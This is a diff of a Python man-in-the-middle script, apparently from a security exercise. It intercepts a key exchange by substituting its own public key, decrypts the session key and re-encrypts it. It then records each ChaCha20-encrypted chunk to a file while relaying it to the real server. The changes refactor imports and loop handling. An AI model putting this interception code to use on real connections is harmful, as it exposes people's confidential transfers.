@@ -3,8 +3,7 @@ import socket
 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
 from cryptography.hazmat.primitives.serialization.base import Encoding, PublicFormat
 
-import utils
-
+from utils import *
 
 def mitm(conf, recv_port, dest_addr, dest_port, recv_filename):
     """
@@ -23,13 +22,14 @@ def mitm(conf, recv_port, dest_addr, dest_port, recv_filename):
     # Send our PK to incoming connection
     conn, client_address = sock_in.accept()
     print("connection accepted, sending public key...")
-    our_pk = utils.get_public_key(conf)
+    our_pk = get_public_key(conf)
     conn.sendall(our_pk.public_bytes(Encoding.PEM, PublicFormat.PKCS1))
 
     # Connect to external server
     sock_out = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print('connecting to {}:{}'.format(dest_addr, dest_port))
     sock_out.connect((dest_addr, int(dest_port)))
+    sock_out.settimeout(TIMEOUT)
     # Receive PK from outgoing server
     their_pk = b''
     print("receiving public key...")
@@ -49,10 +49,10 @@ def mitm(conf, recv_port, dest_addr, dest_port, recv_filename):
     if len(encrypted_shared_key) == 0:
         print("empty shared key received. Exiting...")
         exit(1)
-    key = utils.decrypt_shared_key(conf, encrypted_shared_key)
+    key = decrypt_shared_key(conf, encrypted_shared_key)
 
     # Re encrypt shared key and send to out server
-    encrypted_shared_key = utils.get_encrypted_shared_key(key, their_pk)
+    encrypted_shared_key = get_encrypted_shared_key(key, their_pk)
     chacha20 = ChaCha20Poly1305(key)
     sock_out.sendall(encrypted_shared_key)
 
@@ -62,20 +62,17 @@ def mitm(conf, recv_port, dest_addr, dest_port, recv_filename):
         i = 0
         while True:
             data = b''
-            data += conn.recv(utils.CHUNK_SIZE + 16)  # Encrypted size is CHUNK_SIZE + 16
             try:
+                data += conn.recv(CHUNK_SIZE + 16)  # Encrypted size is CHUNK_SIZE + 16
                 print("decrypting package of size {}...".format(len(data)))
                 decrypted = chacha20.decrypt(i.to_bytes(12, byteorder="big"), data, None)
             except Exception as e:
-                print("error decrypting: {}".format(e))
-                exit(1)
+                break
             f.write(decrypted)
             # Send encrypted message to outgoing server
             print("sending package of size {}...".format(len(data)))
             sock_out.sendall(data)
             i += 1
-            if len(data) < utils.CHUNK_SIZE + 16:
-                break
     print("done!")
     conn.close()
 
